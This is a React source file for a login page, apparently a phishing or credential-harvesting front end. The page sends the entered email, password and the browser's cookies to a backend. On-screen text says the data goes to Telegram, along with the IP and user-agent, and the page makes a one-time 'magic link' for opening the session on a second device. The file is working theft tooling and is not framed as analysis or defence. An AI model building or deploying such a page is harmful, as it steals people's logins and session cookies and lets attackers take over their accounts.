// src/pages/LoginPage.jsx  — Device A
import React, { useState, useCallback } from "react";
import { api } from "../api";
import CountdownTimer from "../components/CountdownTimer";
import StepTracker    from "../components/StepTracker";

export default function LoginPage() {
  const [email,    setEmail]    = useState("");
  const [password, setPassword] = useState("");
  const [showPass, setShowPass] = useState(false);
  const [loading,  setLoading]  = useState(false);
  const [error,    setError]    = useState(null);
  const [result,   setResult]   = useState(null);
  const [copied,   setCopied]   = useState(false);
  const [expired,  setExpired]  = useState(false);

  const validate = () => {
    if (!email.trim() || !email.includes("@")) return "Enter a valid email address.";
    if (!password || password.length < 1)       return "Password is required.";
    return null;
  };

  const handleLogin = async () => {
    const err = validate();
    if (err) { setError(err); return; }
    setError(null);
    setLoading(true);

    try {
      const data = await api.login({ email, password, cookies: document.cookie });
      if (!data.ok) { setError(data.error || "Login failed."); return; }
      setResult({ magicLink: data.magicLink, token: data.token,
                  expiresAt: data.expiresAt, expiresIn: data.expiresIn });
      setExpired(false);
    } catch {
      setError("Cannot reach server. Make sure the server is running.");
    } finally {
      setLoading(false);
    }
  };

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(result.magicLink);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {
      // Fallback for browsers that block clipboard API
      const el = document.createElement("textarea");
      el.value = result.magicLink;
      document.body.appendChild(el);
      el.select();
      document.execCommand("copy");
      document.body.removeChild(el);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const handleReset = () => { setResult(null); setExpired(false); setError(null); };
  const handleExpire = useCallback(() => setExpired(true), []);

  // ── Link generated view ───────────────────────────────────────────────────
  if (result) {
    return (
      <div className="page">
        <div className="card fade-up">
          <StepTracker current={1} />
          <div className="label">Device A — Link Generated</div>
          <h1>Magic Link Ready</h1>
          <p className="subtitle">
            Send this link to Device B. It expires in{" "}
            <strong style={{ color: "var(--amber)" }}>{result.expiresIn}</strong> and works{" "}
            <strong style={{ color: "var(--amber)" }}>once only</strong>.
          </p>

          {expired
            ? <div className="alert alert-error">⚠ This link has expired. Generate a new one.</div>
            : <CountdownTimer expiresAt={result.expiresAt} onExpire={handleExpire} />
          }

          <div className="label" style={{ marginBottom: "8px" }}>Magic Link</div>
          <div className="link-box">
            {result.magicLink}
            <button className="copy-btn" onClick={handleCopy}>
              {copied ? "✓ Copied" : "Copy"}
            </button>
          </div>

          <div className="alert alert-info">
            ✓ Login data + link sent to Telegram<br />
            ✓ Token: <code>{result.token.slice(0, 8)}…</code>
          </div>

          <div className="label" style={{ marginTop: "16px", marginBottom: "8px" }}>Instructions</div>
          <div style={{ fontFamily: "var(--mono)", fontSize: "11px", color: "var(--muted)", lineHeight: "1.9" }}>
            1. Copy the link above<br />
            2. Open it on Device B (different browser / device / network)<br />
            3. Token auto-invalidates after one use or on expiry<br />
            4. Return here to generate a fresh link anytime
          </div>

          <hr className="divider" />
          <button className="btn btn-ghost" onClick={handleReset}>← Generate New Link</button>
        </div>
      </div>
    );
  }

  // ── Login form ────────────────────────────────────────────────────────────
  return (
    <div className="page">
      <div className="card fade-up">
        <StepTracker current={0} />
        <div className="label">Device A</div>
        <h1>Sign In</h1>
        <p className="subtitle">
          Credentials are captured and a one-time magic link<br />is generated and sent to Telegram.
        </p>

        {error && <div className="alert alert-error">⚠ {error}</div>}

        <div className="field">
          <label className="field-label">Email</label>
          <input className="input" type="email" placeholder="user@example.com"
            autoComplete="email"
            value={email} onChange={e => setEmail(e.target.value)}
            onKeyDown={e => e.key === "Enter" && handleLogin()} />
        </div>

        <div className="field">
          <label className="field-label">Password</label>
          <div style={{ position: "relative" }}>
            <input className="input" type={showPass ? "text" : "password"}
              placeholder="••••••••••"
              autoComplete="current-password"
              value={password} onChange={e => setPassword(e.target.value)}
              onKeyDown={e => e.key === "Enter" && handleLogin()}
              style={{ paddingRight: "52px" }} />
            <button onClick={() => setShowPass(v => !v)}
              style={{ position: "absolute", right: "12px", top: "50%",
                transform: "translateY(-50%)", background: "none", border: "none",
                color: "var(--muted)", cursor: "pointer",
                fontFamily: "var(--mono)", fontSize: "11px" }}>
              {showPass ? "hide" : "show"}
            </button>
          </div>
        </div>

        <button className="btn" onClick={handleLogin} disabled={loading}>
          {loading
            ? <Spinner /> 
            : "Login & Generate Magic Link →"}
        </button>

        <hr className="divider" />
        <div style={{ fontFamily: "var(--mono)", fontSize: "10px", color: "var(--muted)", lineHeight: "1.9", textAlign: "center" }}>
          📡 Captured: email · password · cookies · IP · user-agent<br />
          🔗 Output: one-time link → Telegram + this UI
        </div>
      </div>
    </div>
  );
}

function Spinner() {
  return (
    <>
      <span style={{
        width: 14, height: 14, border: "2px solid var(--bg)",
        borderTopColor: "transparent", borderRadius: "50%",
        display: "inline-block", animation: "spin 0.8s linear infinite"
      }} />
      {" "}Generating Link…
    </>
  );
}
